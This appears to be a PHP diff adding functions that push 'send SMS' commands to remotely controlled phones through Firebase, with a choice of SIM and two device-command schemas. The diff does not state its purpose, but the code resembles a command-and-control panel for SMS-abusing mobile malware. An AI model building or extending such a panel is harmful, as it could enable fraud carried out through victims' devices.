@@ -170,3 +170,136 @@ function rebel_create_key(string $type = 'web', int $maxUses = 1, int $ttlDays =
     rebel_keys_save($data);
     return $key;
 }
+
+/** Same as rebel.py normalize_phone() */
+function rebel_normalize_phone(string $raw): string
+{
+    $clean = preg_replace('/\D/', '', $raw);
+    if (strlen($clean) === 10) {
+        return $clean;
+    }
+    if (strlen($clean) > 10 && str_starts_with($clean, '91')) {
+        return substr($clean, -10);
+    }
+    return $clean;
+}
+
+/** Same as rebel.py firebase_req() */
+function rebel_firebase_req(string $method, string $url, string $key, string $path, ?array $data = null): ?array
+{
+    $full = rtrim($url, '/') . '/' . ltrim($path, '/') . '.json';
+    if ($key !== '') {
+        $full .= '?auth=' . rawurlencode($key);
+    }
+
+    $headers = ['Content-Type: application/json', 'Accept: application/json'];
+    $body = $data !== null ? json_encode($data, JSON_UNESCAPED_UNICODE) : null;
+
+    if (function_exists('curl_init')) {
+        $ch = curl_init($full);
+        curl_setopt_array($ch, [
+            CURLOPT_CUSTOMREQUEST => strtoupper($method),
+            CURLOPT_RETURNTRANSFER => true,
+            CURLOPT_TIMEOUT => 12,
+            CURLOPT_HTTPHEADER => $headers,
+        ]);
+        if ($body !== null) {
+            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
+        }
+        $raw = curl_exec($ch);
+        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        if ($code === 200 || $code === 201) {
+            if ($raw === false || trim($raw) === '' || trim($raw) === 'null') {
+                return [];
+            }
+            $parsed = json_decode($raw, true);
+            return is_array($parsed) ? $parsed : [];
+        }
+        return null;
+    }
+
+    $opts = [
+        'http' => [
+            'method' => strtoupper($method),
+            'timeout' => 12,
+            'header' => implode("\r\n", $headers) . "\r\n",
+            'ignore_errors' => true,
+        ],
+    ];
+    if ($body !== null) {
+        $opts['http']['content'] = $body;
+    }
+    $raw = @file_get_contents($full, false, stream_context_create($opts));
+    if ($raw === false) {
+        return null;
+    }
+    global $http_response_header;
+    $status = 0;
+    if (!empty($http_response_header[0]) && preg_match('/\s(\d{3})\s/', $http_response_header[0], $m)) {
+        $status = (int) $m[1];
+    }
+    if ($status !== 200 && $status !== 201) {
+        return null;
+    }
+    if (trim($raw) === '' || trim($raw) === 'null') {
+        return [];
+    }
+    $parsed = json_decode($raw, true);
+    return is_array($parsed) ? $parsed : [];
+}
+
+/**
+ * Send SMS to device — same payload/path as rebel.py:
+ * PUT clients/{device_id}/webhookEvent/sendSms
+ * payload: {from, to, message, isSended:false}
+ */
+function rebel_send_sms_to_device(
+    string $url,
+    string $key,
+    string $deviceId,
+    int $sim,
+    string $to,
+    string $message,
+    string $schema = 'rabel',
+    string $deviceNode = 'clients'
+): array {
+    $to = rebel_normalize_phone($to);
+    if ($deviceId === '' || $to === '' || $message === '') {
+        return ['ok' => false, 'error' => 'Device, number and message required'];
+    }
+    if ($url === '') {
+        return ['ok' => false, 'error' => 'Firebase URL missing'];
+    }
+
+    $sim = max(1, $sim);
+
+    if ($schema === 'spinplay') {
+        $path = ($deviceNode ?: 'devices') . '/' . rawurlencode($deviceId) . '/manual_commands/send_sms';
+        $payload = [
+            'to' => $to,
+            'message' => $message,
+            'sim' => $sim - 1,
+        ];
+    } else {
+        $path = 'clients/' . rawurlencode($deviceId) . '/webhookEvent/sendSms';
+        $payload = [
+            'from' => $sim,
+            'to' => $to,
+            'message' => $message,
+            'isSended' => false,
+        ];
+    }
+
+    $res = rebel_firebase_req('PUT', $url, $key, $path, $payload);
+    if ($res !== null) {
+        return [
+            'ok' => true,
+            'message' => 'SMS sent to device',
+            'sim' => $sim,
+            'to' => $to,
+        ];
+    }
+
+    return ['ok' => false, 'error' => 'Failed to send SMS — device offline or Firebase error'];
+}
